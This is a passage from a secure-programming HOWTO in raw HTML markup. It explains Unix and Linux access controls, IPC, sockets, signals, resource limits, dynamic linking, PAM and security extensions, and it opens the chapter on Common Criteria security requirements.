>Here are their official names, with an explanation, and the
short and long form:

<DIV
CLASS="TABLE"
><A
NAME="AEN687"
></A
><P
><B
>Table 3-1. POSIX ACL Entry Types</B
></P
><TABLE
BORDER="1"
CLASS="CALSTABLE"
><COL
WIDTH="1*"
TITLE="posix-acl-name"><COL
WIDTH="1*"
TITLE="posix-acl-meaning"><COL
WIDTH="1*"
TITLE="short-form"><COL
WIDTH="1*"
TITLE="long-form"><THEAD
><TR
><TH
>POSIX ACL Entry Name</TH
><TH
>Meaning</TH
><TH
>Short Form</TH
><TH
>Long Form</TH
></TR
></THEAD
><TBODY
><TR
><TD
>ACL_USER_OBJ</TD
><TD
>The rights of the owner</TD
><TD
>u::</TD
><TD
>user::</TD
></TR
><TR
><TD
>ACL_USER</TD
><TD
>The rights of some specific user, other than the owner</TD
><TD
>u:USERNAME:</TD
><TD
>user:USERNAME:</TD
></TR
><TR
><TD
>ACL_GROUP_OBJ</TD
><TD
>The rights of the group that owns the file</TD
><TD
>g::</TD
><TD
>group::</TD
></TR
><TR
><TD
>ACL_GROUP</TD
><TD
>The rights of some other group that doesn&#8217;t own the file</TD
><TD
>g:GROUPNAME:</TD
><TD
>group:GROUPNAME:</TD
></TR
><TR
><TD
>ACL_OTHER</TD
><TD
>The rights of anyone not otherwise covered.</TD
><TD
>o::</TD
><TD
>other::</TD
></TR
><TR
><TD
>ACL_MASK</TD
><TD
>The maximum possible rights for everyone, except for the owner and OTHER.</TD
><TD
>m::</TD
><TD
>mask:GROUPNAME:</TD
></TR
></TBODY
></TABLE
></DIV
></P
><P
>The "mask" is the gimmick that makes these extended POSIX ACLs
work well with programs not designed to work with them.
If you specify any specific users or groups other than the owner or
group owner (i.e., you use ACL_USER or ACL_GROUP), then you atuomaticaly
have to have a mask entry.
For more information on POSIX ACLs, see acl(5).</P
></DIV
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="FSO-INITIAL-VALUES"
>3.2.3. Creation Time Initial Values</A
></H3
><P
>At creation time, the following rules apply.
On most Unix systems, when a new filesystem object is created via creat(2)
or open(2), the FSO UID is set to the process&#8217;
EUID and the FSO&#8217;s GID is
set to the process&#8217; EGID.
Linux works slightly differently due to its FSUID
extensions; the FSO&#8217;s UID is set to the process&#8217;
FSUID, and the FSO GID
is set to the process&#8217; FSGUID; if the
containing directory&#8217;s setgid bit is set or the filesystem&#8217;s
<SPAN
CLASS="QUOTE"
>&#8220;GRPID&#8221;</SPAN
> flag is set, the FSO GID is actually set to the
GID of the containing directory.
Many systems, including Sun Solaris and Linux, also support the
setgid directory extensions.
As noted earlier,
this special case supports <SPAN
CLASS="QUOTE"
>&#8220;project&#8221;</SPAN
> directories: to make a <SPAN
CLASS="QUOTE"
>&#8220;project&#8221;</SPAN
>
directory, create a special group for the project,
create a directory for the project owned by that group, then make the
directory setgid: files placed there
are automatically owned by the project.
Similarly, if a new subdirectory is created inside a directory with the
setgid bit set (and the filesystem GRPID isn&#8217;t set), the new subdirectory
will also have its setgid bit set (so that project subdirectories will
<SPAN
CLASS="QUOTE"
>&#8220;do the right thing&#8221;</SPAN
>.); in all other cases the setgid is clear for a new file.
This is the rationale for the <SPAN
CLASS="QUOTE"
>&#8220;user-private group&#8221;</SPAN
> scheme
(used by Red Hat Linux and some others).
In this scheme,
every user is a member of a <SPAN
CLASS="QUOTE"
>&#8220;private&#8221;</SPAN
> group with just themselves as members,
so their defaults can permit the group to read and write any file
(since they&#8217;re the only member of the group).
Thus, when the file&#8217;s group membership
is transferred this way, read and write privileges
are transferred too.
FSO basic access control values (read, write, execute) are computed from
(requested values &#38; ~ umask of process).
New files always start with a clear sticky bit and clear setuid bit.
For more information on POSIX ACLs, see acl(5).</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="CHANGING-ACLS"
>3.2.4. Changing Access Control Attributes</A
></H3
><P
>You can set most of these values with chmod(2), fchmod(2), or chmod(1)
but see also chown(1), and chgrp(1).
In Linux, some of the Linux-unique attributes are manipulated using chattr(1).</P
><P
>Note that in Linux, only root can change the owner of a given file.
Some Unix-like systems allow ordinary users to transfer ownership of their
files to another, but this causes complications and is forbidden by Linux.
For example, if you&#8217;re trying to limit disk usage,
allowing such operations would allow users to claim that large files
actually belonged to some other <SPAN
CLASS="QUOTE"
>&#8220;victim&#8221;</SPAN
>.
For more information on POSIX ACLs, see acl(5).</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="USING-ACLS"
>3.2.5. Using Access Control Attributes</A
></H3
><P
>Under Linux and most Unix-like systems, reading and writing
attribute values are only checked when the file is opened; they
are not re-checked on every read or write.
Still, a large number of calls do check these attributes,
since the filesystem is so central to Unix-like systems.
Calls that check these attributes
include open(2), creat(2), link(2), unlink(2), rename(2),
mknod(2), symlink(2), and socket(2).
For more information on POSIX ACLs, see acl(5).</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="FILESYSTEM-HIERARCHY"
>3.2.6. Filesystem Hierarchy</A
></H3
><P
>Over the years conventions have been built on <SPAN
CLASS="QUOTE"
>&#8220;what files to place where&#8221;</SPAN
>.
Where possible,
please follow conventional use when placing information in the hierarchy.
For example, place global configuration information in /etc.
The Filesystem Hierarchy Standard (FHS) tries to
define these conventions in a logical manner, and is widely used by
Linux systems.
The FHS is an update to the previous
Linux Filesystem Structure standard (FSSTND), incorporating lessons
learned and approaches from Linux, BSD, and System V systems.
See <A
HREF="http://www.pathname.com/fhs"
TARGET="_top"
>http://www.pathname.com/fhs</A
> for more information about the FHS.
A summary of these conventions is in hier(5) for Linux
and hier(7) for Solaris.
Sometimes different conventions disagree; where possible, make these
situations configurable at compile or installation time.</P
><P
>I should note that the FHS has been adopted by the
<A
HREF="http://www.linuxbase.org"
TARGET="_top"
>Linux Standard Base</A
> which
is developing and promoting a set of standards to increase
compatibility among Linux distributions and to enable
software applications to run on any compliant Linux system.</P
></DIV
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="SYSV-IPC"
>3.3. System V IPC</A
></H2
><P
>Many Unix-like systems, including
Linux and System V systems, support System V interprocess communication
(IPC) objects.
Indeed System V IPC is required by the
Open Group&#8217;s Single UNIX Specification, Version 2
[Open Group 1997].
System V IPC objects can be one of three kinds:
System V message queues, semaphore sets, and shared memory segments. 
Each such object has the following attributes:

<P
></P
><UL
><LI
><P
>read and write permissions for each of creator, creator group, and
others.</P
></LI
><LI
><P
>creator UID and GID - UID and GID of the creator of the object.</P
></LI
><LI
><P
>owning UID and GID - UID and GID of the owner of the
object (initially equal to the creator UID).</P
></LI
></UL
>&#13;</P
><P
>When accessing such objects, the rules are as follows:

<P
></P
><UL
><LI
><P
>if the process has root privileges, the access is granted.</P
></LI
><LI
><P
>if the process&#8217; EUID is the owner or creator UID of the object,
then the appropriate creator permission bit is
checked to see if access is granted.</P
></LI
><LI
><P
>if the process&#8217; EGID is the owner or creator GID of the object,
or one of the process&#8217; groups is the owning or creating GID of the object,
then the appropriate creator group permission bit is checked for access.</P
></LI
><LI
><P
>otherwise, the appropriate <SPAN
CLASS="QUOTE"
>&#8220;other&#8221;</SPAN
> permission bit is checked
for access.</P
></LI
></UL
>&#13;</P
><P
>Note that root, or a process with the EUID of either the owner or creator,
can set the owning UID and owning GID and/or remove the object.
More information is available in ipc(5).</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="SOCKETS"
>3.4. Sockets and Network Connections</A
></H2
><P
>Sockets are used for communication, particularly over a network.
Sockets were originally developed by the
BSD branch of Unix systems, but they are generally portable to other
Unix-like systems: Linux and System V variants support sockets as well, and
socket support is required by the Open Group&#8217;s
Single Unix Specification [Open Group 1997].
System V systems traditionally used a different (incompatible) network
communication interface, but it&#8217;s worth noting that systems like Solaris
include support for sockets.
Socket(2) creates an endpoint for communication and returns a descriptor,
in a manner similar to open(2) for files.
The parameters for socket specify the protocol family and type,
such as the Internet domain (TCP/IP version 4), Novell&#8217;s IPX,
or the <SPAN
CLASS="QUOTE"
>&#8220;Unix domain&#8221;</SPAN
>.
A server then typically calls bind(2), listen(2), and accept(2) or select(2).
A client typically calls bind(2) (though that may be omitted) and
connect(2).
See these routine&#8217;s respective man pages for more information.
It can be difficult to understand how to use sockets from their man pages;
you might want to consult other papers such as
Hall "Beej" [1999]
to learn how these calls are used together.</P
><P
>The <SPAN
CLASS="QUOTE"
>&#8220;Unix domain sockets&#8221;</SPAN
> don&#8217;t actually represent a network protocol; they
can only connect to sockets on the same machine.
(at the time of this writing for the standard Linux kernel).
When used as a stream, they are fairly similar to named pipes, but with
significant advantages.
In particular, Unix domain socket is connection-oriented; each new connection to
the socket results in a new communication channel, a very different situation
than with named pipes.
Because of this property, Unix domain sockets are often used instead of
named pipes to implement IPC for many important services.
Just like you can have unnamed pipes, you can have unnamed Unix domain sockets
using socketpair(2); unnamed Unix domain sockets
are useful for IPC in a way similar to unnamed pipes.</P
><P
>There are several interesting security implications of Unix domain sockets.
First, although Unix domain sockets can appear in the filesystem and can have
stat(2) applied to them, you can&#8217;t use open(2) to open them (you have
to use the socket(2) and friends interface).
Second, Unix domain sockets can be used to pass
file descriptors between processes (not just the file&#8217;s contents).
This odd capability, not available in any other IPC mechanism, has been used
to hack all sorts of schemes (the descriptors can basically
be used as a limited version of the
<SPAN
CLASS="QUOTE"
>&#8220;capability&#8221;</SPAN
> in the computer science sense of the term).
File descriptors are sent using sendmsg(2), where the msg (message)&#8217;s
field msg_control points to an array of control message headers
(field msg_controllen must specify the number of bytes contained in the array).
Each control message is a struct cmsghdr followed by data, and for this purpose
you want the cmsg_type set to SCM_RIGHTS.
A file descriptor is retrieved through recvmsg(2) and then tracked down in
the analogous way.
Frankly, this feature is quite baroque, but it&#8217;s worth knowing about.</P
><P
>Linux 2.2 and later
supports an additional feature in Unix domain sockets: you can
acquire the peer&#8217;s <SPAN
CLASS="QUOTE"
>&#8220;credentials&#8221;</SPAN
> (the pid, uid, and gid).
Here&#8217;s some sample code:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> /* fd= file descriptor of Unix domain socket connected
    to the client you wish to identify */

 struct ucred cr;
 int cl=sizeof(cr);

 if (getsockopt(fd, SOL_SOCKET, SO_PEERCRED, &#38;cr, &#38;cl)==0) {
   printf("Peer&#38;rsquo;s pid=%d, uid=%d, gid=%d\n",
           cr.pid, cr.uid, cr.gid);</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>Standard Unix convention is that binding to
TCP and UDP local port numbers less than 1024 requires
root privilege, while any process can bind to an unbound port number
of 1024 or greater.
Linux follows this convention,
more specifically, Linux requires a process to have the
capability CAP_NET_BIND_SERVICE to bind to a port number less than 1024;
this capability is normally only held by processes with an EUID of 0.
The adventurous can check this in Linux by examining its Linux&#8217;s source;
in Linux 2.2.12, it&#8217;s file <TT
CLASS="FILENAME"
>/usr/src/linux/net/ipv4/af_inet.c</TT
>,
function inet_bind().</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="SIGNALS"
>3.5. Signals</A
></H2
><P
>Signals are a simple form of <SPAN
CLASS="QUOTE"
>&#8220;interruption&#8221;</SPAN
> in the Unix-like OS world,
and are an ancient part of Unix.
A process can set a <SPAN
CLASS="QUOTE"
>&#8220;signal&#8221;</SPAN
> on another process (say using
kill(1) or kill(2)), and that other process would receive and
handle the signal asynchronously.
For a process to have permission to send an arbitrary
signal to some other process,
the sending process must either have root privileges, or
the real or effective user ID of the sending process
must equal the real or saved set-user-ID of the receiving process.
However, some signals can be sent in other ways.
In particular, SIGURG can be delivered over a network through the
TCP/IP out-of-band (OOB) message.</P
><P
>Although signals are an ancient part of Unix, they've had different
semantics in different implementations.
Basically, they involve questions such as
<SPAN
CLASS="QUOTE"
>&#8220;what happens when a signal
occurs while handling another signal&#8221;</SPAN
>?
The older Linux libc 5 used a different set of semantics for some signal
operations than the newer GNU libc libraries.
Calling C library functions is often unsafe within a
signal handler, and even some system calls aren&#8217;t safe;
you need to examine the documentation for each call you make to see
if it promises to be safe to call inside a signal.
For more information, see the glibc FAQ (on some systems a local
copy is available at <TT
CLASS="FILENAME"
>/usr/doc/glibc-*/FAQ</TT
>).</P
><P
>For new programs, just use the POSIX signal system
(which in turn was based on BSD work); this set is widely supported
and doesn&#8217;t have some of the problems
that some of the older signal systems did.
The POSIX signal system is based on using the sigset_t datatype,
which can
be manipulated through a set of operations: sigemptyset(),
sigfillset(), sigaddset(), sigdelset(), and sigismember().
You can read about these in sigsetops(3).
Then use sigaction(2), sigprocmask(2),
sigpending(2), and sigsuspend(2) to set up an manipulate signal handling
(see their man pages for more information).</P
><P
>In general, make any signal handlers very short and simple, and
look carefully for race conditions.
Signals, since they are by nature asynchronous,
can easily cause race conditions.</P
><P
>A common convention exists for servers: if you receive SIGHUP, you should
close any log files, reopen and reread configuration files, and then
re-open the log files.
This supports reconfiguration without halting the server and
log rotation without data loss.
If you are writing a server where this convention makes sense,
please support it.</P
><P
>Michal Zalewski [2001] has written an excellent tutorial on how
signal handlers are exploited, and has recommendations for how to
eliminate signal race problems.
I encourage looking at his summary for more information; here are
my recommendations, which are similar to Michal&#8217;s work:
<P
></P
><UL
><LI
><P
>Where possible, have your signal handlers unconditionally set a specific flag
and do nothing else.</P
></LI
><LI
><P
>If you must have more complex signal handlers,
use only calls specifically designated as being safe for use
in signal handlers.
In particular,
don&#8217;t use malloc() or free() in C (which on most systems
aren&#8217;t protected against signals), nor the many functions that depend on them
(such as the printf() family and syslog()).
You could try to <SPAN
CLASS="QUOTE"
>&#8220;wrap&#8221;</SPAN
> calls to insecure library calls with a check
to a global flag (to avoid re-entry), but I wouldn&#8217;t recommend it.</P
></LI
><LI
><P
>Block signal delivery during all non-atomic operations in the program, and
block signal delivery inside signal handlers.</P
></LI
></UL
></P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="QUOTAS"
>3.6. Quotas and Limits</A
></H2
><P
>Many Unix-like systems have
mechanisms to support filesystem quotas and process resource limits.
This certainly includes Linux.
These mechanisms are particularly useful for preventing denial of service
attacks; by limiting the resources available to each user, you can make
it hard for a single user to use up all the system resources.
Be careful with terminology here, because both filesystem quotas
and process resource limits have <SPAN
CLASS="QUOTE"
>&#8220;hard&#8221;</SPAN
> and
<SPAN
CLASS="QUOTE"
>&#8220;soft&#8221;</SPAN
> limits but the terms mean slightly different things.</P
><P
>You can define storage (filesystem) quota limits on each mountpoint
for the number of blocks of storage and/or the number of unique files
(inodes) that can be used, and you can set such limits for a given user
or a given group.
A <SPAN
CLASS="QUOTE"
>&#8220;hard&#8221;</SPAN
> quota limit is a never-to-exceed limit, while a
<SPAN
CLASS="QUOTE"
>&#8220;soft&#8221;</SPAN
> quota can be temporarily exceeded.
See quota(1), quotactl(2), and quotaon(8).</P
><P
>The rlimit mechanism supports a large number of process quotas, such as
file size, number of child processes, number of open files, and so on.
There is a <SPAN
CLASS="QUOTE"
>&#8220;soft&#8221;</SPAN
> limit (also called the current limit) and a
<SPAN
CLASS="QUOTE"
>&#8220;hard limit&#8221;</SPAN
> (also called the upper limit).
The soft limit cannot be exceeded at any time, but through calls it can
be raised up to the value of the hard limit.
See getrlimit(2), setrlimit(2), and getrusage(2), sysconf(3), and
ulimit(1).
Note that there are several ways to set these limits, including the
PAM module pam_limits.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="DLLS"
>3.7. Dynamically Linked Libraries</A
></H2
><P
>Practically all programs depend on libraries to execute.
In most modern Unix-like systems, including Linux,
programs are by default compiled to use <EM
>dynamically linked libraries</EM
>
(DLLs).
That way, you can update a library and all the programs using that library
will use the new (hopefully improved) version if they can.</P
><P
>Dynamically linked libraries are typically placed in one a few special
directories. The usual directories include
<TT
CLASS="FILENAME"
>/lib</TT
>, <TT
CLASS="FILENAME"
>/usr/lib</TT
>, <TT
CLASS="FILENAME"
>/lib/security</TT
>
for PAM modules, 
<TT
CLASS="FILENAME"
>/usr/X11R6/lib</TT
> for X-windows, and <TT
CLASS="FILENAME"
>/usr/local/lib</TT
>.
You should use these standard conventions in your programs, in particular,
except during debugging you shouldn&#8217;t use value computed from the
current directory as a source for dynamically linked libraries (an
attacker may be able to add their own choice <SPAN
CLASS="QUOTE"
>&#8220;library&#8221;</SPAN
> values).</P
><P
>There are special conventions for naming libraries and having symbolic
links for them, with the result that you can update libraries and still
support programs that want to use old, non-backward-compatible versions
of those libraries.
There are also ways to override specific libraries or even just
specific functions in a library when executing a particular program.
This is a real advantage of Unix-like systems over
Windows-like systems; I believe Unix-like systems have a much better system
for handling library updates, one reason that Unix and Linux systems are reputed
to be more stable than Windows-based systems.</P
><P
>On GNU glibc-based systems, including all Linux systems,
the list of directories automatically searched during program start-up is
stored in the file /etc/ld.so.conf.
Many Red Hat-derived distributions don&#8217;t normally
include <TT
CLASS="FILENAME"
>/usr/local/lib</TT
>
in the file <TT
CLASS="FILENAME"
>/etc/ld.so.conf</TT
>.
I consider this a bug, and adding <TT
CLASS="FILENAME"
>/usr/local/lib</TT
> to
<TT
CLASS="FILENAME"
>/etc/ld.so.conf</TT
>
is a common <SPAN
CLASS="QUOTE"
>&#8220;fix&#8221;</SPAN
> required to run many programs on Red Hat-derived systems.
If you want to just override a few functions in a library, but keep the
rest of the library, you can enter the names of overriding libraries
(.o files) in <TT
CLASS="FILENAME"
>/etc/ld.so.preload</TT
>;
these <SPAN
CLASS="QUOTE"
>&#8220;preloading&#8221;</SPAN
> libraries will take precedence over the standard set.
This preloading file is typically used for emergency patches;
a distribution usually won&#8217;t include such a file when delivered.
Searching all of these directories at program start-up would be too
time-consuming, so a caching arrangement is actually used.
The program ldconfig(8) by default reads in the file /etc/ld.so.conf,
sets up the appropriate symbolic links in the dynamic link directories
(so they&#8217;ll follow the standard conventions),
and then writes a cache to /etc/ld.so.cache that&#8217;s then used by other
programs.
So, ldconfig has to be run whenever a DLL is added, when a DLL is removed,
or when the set of DLL directories changes; running ldconfig is often
one of the steps performed by package managers
when installing a library.
On start-up, then, a program uses the dynamic loader to
read the file /etc/ld.so.cache and then load the libraries it needs.</P
><P
>Various environment variables can control this process, and in fact
there are environment variables that permit you to
override this process (so, for example, you can temporarily
substitute a different library for this particular execution).
In Linux,
the environment variable
LD_LIBRARY_PATH is a colon-separated set of directories where libraries
are searched for first, before the standard set of directories;
this is useful when debugging a new library or using a nonstandard
library for special purposes, but be sure you trust those who can
control those directories.
The variable LD_PRELOAD lists object files with functions that override
the standard set, just as /etc/ld.so.preload does.
The variable LD_DEBUG, displays debugging information; if set
to <SPAN
CLASS="QUOTE"
>&#8220;all&#8221;</SPAN
>, voluminous information about the dynamic linking process
is displayed while it&#8217;s occurring.</P
><P
>Permitting user control over dynamically linked libraries
would be disastrous for setuid/setgid programs if special measures
weren&#8217;t taken.
Therefore, in the GNU glibc implementation, if the program is setuid or setgid
these variables (and other similar variables) are ignored or greatly
limited in what they can do.
The GNU glibc library determines if a program is setuid or setgid
by checking the program&#8217;s credentials;
if the UID and EUID differ, or the GID and the EGID differ, the
library presumes the program is setuid/setgid (or descended from one)
and therefore greatly limits its abilities to control linking.
If you load the GNU glibc libraries, you can see this; see especially
the files elf/rtld.c and sysdeps/generic/dl-sysdep.c.
This means that if you cause the UID and GID to equal the EUID and EGID,
and then call a program, these variables will have full effect.
Other Unix-like systems handle the situation differently but for the
same reason: a setuid/setgid program should not be unduly affected
by the environment variables set.
Note that graphical user interface toolkits generally do permit
user control over dynamically linked libraries, because
executables that directly invoke graphical user inteface toolkits
should never, ever, be setuid (or have other special privileges) at all.
For more about how to develop secure GUI applications, see
<A
HREF="#MINIMIZE-PRIVILEGED-MODULES"
>Section 7.4.4</A
>.</P
><P
>For Linux systems, you can get more information from my document, the
<A
HREF="http://www.dwheeler.com/program-library"
TARGET="_top"
><EM
>Program Library HOWTO</EM
></A
>.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="AUDIT"
>3.8. Audit</A
></H2
><P
>Different Unix-like systems handle auditing differently.
In Linux, the most common <SPAN
CLASS="QUOTE"
>&#8220;audit&#8221;</SPAN
> mechanism is syslogd(8), usually working
in conjunction with klogd(8).
You might also want to look at wtmp(5), utmp(5), lastlog(8), and acct(2).
Some server programs (such as the Apache web server)
also have their own audit trail mechanisms.
According to the FHS, audit logs should be stored in /var/log or its
subdirectories.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="PAM"
>3.9. PAM</A
></H2
><P
>Sun Solaris and nearly all Linux systems use the
Pluggable Authentication Modules (PAM) system for authentication.
PAM permits run-time configuration of authentication methods
(e.g., use of passwords, smart cards, etc.).
See <A
HREF="#USE-PAM"
>Section 11.6</A
> for more information on using PAM.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="UNIX-EXTENSIONS"
>3.10. Specialized Security Extensions for Unix-like Systems</A
></H2
><P
>A vast amount of research and development has gone into
extending Unix-like systems to support security needs of various
communities.
For example, several Unix-like systems have been extended to support the
U.S. military&#8217;s desire for multilevel security.
If you&#8217;re developing software, you should try to design your software
so that it can work within these extensions.</P
><P
>FreeBSD has a new system call,
<A
HREF="http://docs.freebsd.org/44doc/papers/jail/jail.html"
TARGET="_top"
>jail(2)</A
>.
The jail system call supports sub-partitioning an environment
into many virtual machines (in a sense, a <SPAN
CLASS="QUOTE"
>&#8220;super-chroot&#8221;</SPAN
>);
its most popular use has been to provide
virtual machine services for Internet Service Provider environments. 
Inside a jail, all processes (even those owned by root)
have the the scope of their requests limited to the jail.
When a FreeBSD system is booted up after a fresh install,
no processes will be in jail.
When a process is placed in a jail, it, and any descendants of
that process created will be in that jail.
Once in a jail,
access to the file name-space is restricted in the style of chroot(2)
(with typical chroot escape routes blocked),
the ability to bind network resources is limited to a specific IP address,
the ability to manipulate system resources and perform privileged operations
is sharply curtailed, and the ability to interact with other processes
is limited to only processes inside the same jail. 
Note that each jail is bound to a single IP address;
processes within the jail may not make use of any other IP
address for outgoing or incoming connections.
More information is available in the
<A
HREF="http://www.onlamp.com/pub/a/bsd/2003/09/04/jails.html"
TARGET="_top"
>OnLamp.com
article on FreeBSD Jails</A
>.</P
><P
>Some extensions available in Linux, such as POSIX capabilities and
special mount-time options, have already been discussed.
Here are a few of these efforts for Linux systems for creating
restricted execution environments; there are many different approaches.
Linux 2.6 adds the "Linux Security Module" (LSM) interface, which allows
administrators to plug in modules to perform more sophisticated
access control systems.
The U.S. National Security Agency (NSA) has developed
<A
HREF="http://www.nsa.gov/selinux"
TARGET="_top"
>Security-Enhanced Linux (Flask)</A
>
(SELinux),
which supports defining a security policy in a specialized language
and then enforces that policy.
Originally SELinux was developed as a separate set of patches, but it
now works using LSM and NSA has submitted the SELinux kernel module to
the Linux developers for inclusion in the normal kernel.
The <A
HREF="http://medusa.fornax.sk"
TARGET="_top"
>Medusa DS9</A
>
extends Linux by supporting, at the kernel level,
a user-space authorization server.
<A
HREF="http://www.lids.org"
TARGET="_top"
>LIDS</A
>
protects files and processes, allowing administrators to
<SPAN
CLASS="QUOTE"
>&#8220;lock down&#8221;</SPAN
> their system.
The <SPAN
CLASS="QUOTE"
>&#8220;Rule Set Based Access Control&#8221;</SPAN
> system,
<A
HREF="http://www.rsbac.de"
TARGET="_top"
>RSBAC</A
>
is based on the Generalized Framework for Access Control (GFAC)
by Abrams and LaPadula and provides a flexible system of access
control based on several kernel modules.
<A
HREF="http://subterfugue.org"
TARGET="_top"
>Subterfugue</A
>
is a framework for <SPAN
CLASS="QUOTE"
>&#8220;observing and playing with the reality of software&#8221;</SPAN
>;
it can intercept system calls and change their parameters
and/or change their return values to implement sandboxes, tracers,
and so on;
it runs under Linux 2.4 with no changes (it doesn&#8217;t require
any kernel modifications).
<A
HREF="http://www.cs.berkeley.edu/~daw/janus"
TARGET="_top"
>Janus</A
>
is a security tool for sandboxing untrusted applications
within a restricted execution environment.
Some have even used
<A
HREF="http://user-mode-linux.sourceforge.net"
TARGET="_top"
>User-mode Linux</A
>,
which implements <SPAN
CLASS="QUOTE"
>&#8220;Linux on Linux&#8221;</SPAN
>, as a sandbox implementation.
Because there are so many different approaches to implementing more
sophisticated security models, Linus Torvalds has requested that a
generic approach be developed so different security policies can be
inserted; for more information about this, see
<A
HREF="http://mail.wirex.com/mailman/listinfo/linux-security-module"
TARGET="_top"
>http://mail.wirex.com/mailman/listinfo/linux-security-module</A
>.</P
><P
>There are many other extensions for security on various Unix-like systems,
but these are really outside the scope of this document.</P
></DIV
></DIV
><DIV
CLASS="CHAPTER"
><HR><H1
><A
NAME="REQUIREMENTS"
></A
>Chapter 4. Security Requirements</H1
><TABLE
BORDER="0"
WIDTH="100%"
CELLSPACING="0"
CELLPADDING="0"
CLASS="EPIGRAPH"
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="LEFT"
VALIGN="TOP"
><I
><P
><I
>You will know that your tent is secure;
you will take stock of your property and find nothing missing.</I
></P
></I
></TD
></TR
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="RIGHT"
VALIGN="TOP"
><I
><SPAN
CLASS="ATTRIBUTION"
>Job 5:24 (NIV)</SPAN
></I
></TD
></TR
></TABLE
><P
>Before you can determine if a program is secure, you need to determine
exactly what its security requirements are.
Obviously, your specific requirements depend on the kind of system
and data you manage.</P
><P
>For example,
any person or company doing business in the state of California
is responsible for notifying California residents
when an unauthorized person acquires unencrypted computer data if that
data includes first name, last name, and
at least one of the following: Social Security Number,
driver&#8217;s license number, account number, debit or credit card information.
(<A
HREF="http://www.net-security.org/article.php?id=500"
TARGET="_top"
>Senate bill 1386 aka Civil Code 1798.82, effective July 1, 2003</A
>).</P
><P
>Thankfully, there&#8217;s an international standard for identifying and defining
security requirements that is useful for many such circumstances:
the Common Criteria [CC 1999], standardized as ISO/IEC 15408:1999.
The CC is the culmination of decades of work to identify
information technology security requirements.
There are other schemes for defining security requirements and evaluating
products to see if products meet the requirements,
such as NIST FIPS-140 for cryptographic equipment,
but these other schemes are generally focused on a
specialized area and won&#8217;t be considered further here.</P
><P
>This chapter briefly describes the Common Criteria (CC) and how to use its
concepts to help you informally identify security requirements and
talk with others about security requirements using standard terminology.
The language of the CC is more precise, but it&#8217;s also more formal and
harder to understand; hopefully the text in this section will help you
<SPAN
CLASS="QUOTE"
>&#8220;get the jist&#8221;</SPAN
>.</P
><P
>Note that, in some circumstances, software cannot be used unless it
has undergone a CC evaluation by an accredited laboratory.
This includes certain kinds of uses in the U.S. Department of Defense
(as specified by NSTISSP Number 11, which requires that before some
products can be used they must be evaluated or enter evaluation),
and in the future such a requirement may
also include some kinds of uses for software in the U.S. federal government.
This section doesn&#8217;t provide enough information
if you plan to actually go through a CC evaluation by an
accredited laboratory.
If you plan to go through a formal evaluation,
you need to read the real CC, examine various websites to really understand
the basics of the CC, and
eventually contract a lab accredited to do a CC evaluation.</P
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="CC-INTRO"
>4.1. Common Criteria Introduction</A
></H2
><P
>First, some general information about the CC will help understand
how to apply its concepts.
The CC&#8217;s official name is
<EM
>The Common Criteria for Information Technology Security Evaluation</EM
>,
though it&#8217;s normally just called the Common Criteria.
The CC document has three parts:
the introduction (that describes the CC overall),
security functional requirements (that lists various kinds of security
functions that products might want to include),
and security assurance requirements (that lists various methods of
assuring that a product is secure).
There is also a related document, the
<EM
>Common Evaluation Methodology</EM
> (CEM),
that guides evaluators how to apply the CC when doing formal evaluations
(in particular, it amplifies what the CC means in certain cases).</P
><P
>Although the CC is International Standard ISO/IEC 15408:1999,
it is outrageously expensive to order the CC from ISO.
Hopefully someday ISO will follow the lead of other standards
organizations such as the IETF and the W3C, which freely redistribute
standards.
Not surprisingly, IETF and W3C standards are followed more often than
many ISO standards, in part because ISO&#8217;s fees for standards simply
make them inaccessible to most developers.
(I don&#8217;t mind authors being paid for their work, but ISO doesn&#8217;t
fund most of the standards development work - indeed, many of the developers
of ISO documents are volunteers - so ISO&#8217;s indefensible fees only line their
own pockets and don&#8217;t actually aid the authors or users at all.)
Thankfully, the CC developers anticipated this problem and have made sure
that the CC&#8217;s technical content is freely available to all;
you can download the CC&#8217;s technical content from
<A
HREF="http://csrc.nist.gov/cc/ccv20/ccv2list.htm"
TARGET="_top"
>http://csrc.nist.gov/cc/ccv20/ccv2list.htm</A
>
Even those doing formal evaluation processes usually
use these editions of the CC, and not the ISO versions;
there&#8217;s simply no good reason to pay ISO for them.</P
><P
>Although it can be used in other ways, the CC is typically
used to create two kinds of documents, a
<SPAN
CLASS="QUOTE"
>&#8220;Protection Profile&#8221;</SPAN
> (PP) or a <SPAN
CLASS="QUOTE"
>&#8220;Security Target&#8221;</SPAN
> (ST).
A <SPAN
CLASS="QUOTE"
>&#8220;protection profile&#8221;</SPAN
> (PP) is a document created by group of users
(for example, a consumer group or large organization)
that identifies the desired security properties of a product.
Basically, a PP is a list of user security requirements,
described in a very specific way defined by the CC.
If you&#8217;re building a product similar to other existing products, it&#8217;s
quite possible that there are one or more PPs that define what some
users believe are necessary for that kind of product
(e.g., an operating system or firewall).
A <SPAN
CLASS="QUOTE"
>&#8220;security target&#8221;</SPAN
> (ST) is a document that identifies what a product
actually does, or a subset of it, that is security-relevant.
An ST doesn&#8217;t need to meet the requirements of
any particular PP, but an ST could meet the requirements of one or more PPs.</P
